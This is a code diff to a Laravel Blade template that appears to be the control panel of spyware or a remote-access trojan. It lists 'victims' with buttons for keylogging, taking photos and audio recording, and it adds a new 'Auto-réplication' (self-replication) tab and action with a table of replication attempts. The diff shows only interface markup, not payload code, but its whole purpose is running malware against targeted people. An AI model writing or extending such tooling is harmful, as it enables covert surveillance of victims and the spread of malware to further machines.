@@ -36,6 +36,9 @@
                         <li class="nav-item flex-fill" role="presentation">
                             <button class="nav-link w-100" id="keylogger-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-keylogger" type="button" role="tab" aria-controls="keylogger" aria-selected="false">Keylogger</button>
                         </li>
+                        <li class="nav-item flex-fill" role="autoréplication">
+                            <button class="nav-link w-100" id="autorep-tab" data-bs-toggle="tab" data-bs-target="#bordered-justified-autorep" type="button" role="tab" aria-controls="autorep" aria-selected="false">Auto-réplication</button>
+                        </li>
                     </ul>
                     @if(session('output'))
                         <div class="alert alert-info">{{ session('output') }}</div>
@@ -86,12 +89,20 @@
                                                 <i class="bi bi-camera-fill"></i> Photo
                                             </button>
                                         </form>
-                                        <form method="POST" action="{{ route('victims.record') }}">
+                                        <form method="POST" action="{{ route('victims.record') }}" class="me-2">
                                             @csrf
                                             <input type="hidden" name="victim_id" value="{{ $victim->id }}">
                                             <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
                                             <button type="submit" class="btn btn-warning">
                                                 <i class="bi bi-mic-fill"></i> Enregistrement
+                                            </button>
+                                        </form>
+                                        <form method="POST" action="{{ route('victims.autorep') }}">
+                                            @csrf
+                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
+                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                            <button type="submit" class="btn btn-warning">
+                                                <i class="bi bi-arrow-repeat"></i> Auto-réplication
                                             </button>
                                         </form>
                                     </div>
@@ -348,6 +359,49 @@
                                                             <button type="button" class="btn btn-success">Télécharger</button>
                                                             <button type="button" class="btn btn-danger">Supprimer</button>
                                                         </td>
+                                                    </tr>
+                                                @endforeach
+                                            </tbody>
+                                        </table>
+                                    @endif
+                                </div>
+                            </div>
+                        </div>
+                        <!-- Auto -réplication -->
+                        <div class="tab-pane fade" id="bordered-justified-autorep" role="tabpanel" aria-labelledby="autorep-tab">
+                            <div class="card">
+                                <div class="card-body">
+                                    <h5 class="card-title">Auto-Réplication</h5>
+                                    <form method="POST" action="{{ route('victims.autorep') }}">
+                                            @csrf
+                                            <input type="hidden" name="victim_id" value="{{ $victim->id }}">
+                                            <input type="hidden" name="victim_uid" value="{{ $victim->uid }}">
+                                            <button type="submit" class="btn btn-warning">
+                                                <i class="bi bi-arrow-repeat"></i> Auto-réplication
+                                            </button>
+                                        </form>
+                                    <br>
+                                    @if ($autoreps->isEmpty())
+                                        <div class="alert alert-warning" role="alert">
+                                            Aucune Auto-Réplication enregistrée.
+                                        </div>
+                                    @else
+                                        <table class="table">
+                                            <thead>
+                                                <tr>
+                                                    <th scope="col">Id</th>
+                                                    <th scope="col">statut</th>
+                                                    <th scope="col">Heure</th>
+                                                    <th scope="col">Date</th>
+                                                </tr>
+                                            </thead>
+                                            <tbody>
+                                                @foreach ($autoreps as $autorep)
+                                                    <tr>
+                                                        <th scope="row">{{ $autorep->id }}</th>
+                                                        <td>{{ $autorep->state }}</td>
+                                                        <td>{{ $autorep->created_at->format('H:i') }}</td>
+                                                        <td>{{ $autorep->created_at->format('d/m/Y') }}</td>
                                                     </tr>
                                                 @endforeach
                                             </tbody>
